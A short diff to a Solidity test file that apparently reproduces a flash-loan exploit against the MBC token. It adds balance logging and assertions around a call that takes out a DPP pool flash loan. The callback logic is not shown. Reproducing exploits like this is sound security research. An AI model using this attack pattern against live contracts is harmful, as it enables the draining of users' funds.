@@ -49,8 +49,20 @@ contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
 
     function test_attack() external  {
         console.log('===== STEP 1: REQUEST FLASHLOAN =====');
+        logBalancesWithLabel('Attacker Contract', address(this));
+        uint256 balanceUsdtBefore = usdt.balanceOf(address(this));
+        uint256 balanceMBCBefore = mbc.balanceOf(address(this));
+        uint256 balanceZZSHBefore = zzsh.balanceOf(address(this));
 
         dppOracle.flashLoan(0, usdt.balanceOf(address(dppOracle)), address(this), hex'30');
+
+        uint256 balanceUsdtAfter = usdt.balanceOf(address(this));
+        uint256 balanceMBCAfter = mbc.balanceOf(address(this));
+        uint256 balanceZZSHAfter = zzsh.balanceOf(address(this));
+
+        assertGe(balanceUsdtAfter, balanceUsdtBefore);
+        assertGe(balanceZZSHAfter, balanceZZSHBefore);
+        assertGe(balanceMBCAfter, balanceMBCBefore);
     }
 
     function DPPFlashLoanCall(address sender, uint256 amount1, uint256 amount2, bytes memory ) external {
